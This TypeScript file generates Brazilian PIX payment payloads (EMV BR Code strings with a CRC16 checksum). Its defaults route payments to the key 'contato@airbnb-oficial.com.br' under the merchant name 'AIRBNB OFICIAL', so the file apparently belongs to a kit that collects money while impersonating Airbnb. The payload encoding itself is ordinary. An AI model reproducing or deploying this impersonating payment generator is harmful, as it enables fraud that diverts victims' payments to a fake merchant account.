function crc16(str: string): string {
  let crc = 0xffff;
  for (let i = 0; i < str.length; i++) {
    crc ^= str.charCodeAt(i) << 8;
    for (let j = 0; j < 8; j++) {
      if ((crc & 0x8000) !== 0) {
        crc = ((crc << 1) ^ 0x1021) & 0xffff;
      } else {
        crc = (crc << 1) & 0xffff;
      }
    }
  }
  return crc.toString(16).toUpperCase().padStart(4, '0');
}

function emvFormat(id: string, value: string): string {
  const len = String(value.length).padStart(2, '0');
  return `${id}${len}${value}`;
}

export interface PixPayloadOptions {
  key?: string;
  name?: string;
  city?: string;
  amount: number | string;
  txid?: string;
}

export function generatePixPayload({
  key = 'contato@airbnb-oficial.com.br',
  name = 'AIRBNB OFICIAL',
  city = 'SAO PAULO',
  amount,
  txid = '***',
}: PixPayloadOptions): string {
  const cleanKey = key;
  const cleanName = name.substring(0, 25);
  const cleanCity = city.substring(0, 15);
  const cleanAmount = Number(amount).toFixed(2);

  const gui = emvFormat('00', 'br.gov.bcb.pix');
  const chave = emvFormat('01', cleanKey);
  const merchantAccount = emvFormat('26', `${gui}${chave}`);

  const mcc = emvFormat('52', '0000');
  const currency = emvFormat('53', '986');
  const formattedAmount = emvFormat('54', cleanAmount);
  const country = emvFormat('58', 'BR');
  const merchantName = emvFormat('59', cleanName);
  const merchantCity = emvFormat('60', cleanCity);
  const additionalData = emvFormat('62', emvFormat('05', txid));

  const raw = `000201${merchantAccount}${mcc}${currency}${formattedAmount}${country}${merchantName}${merchantCity}${additionalData}6304`;
  const checksum = crc16(raw);
  return `${raw}${checksum}`;
}
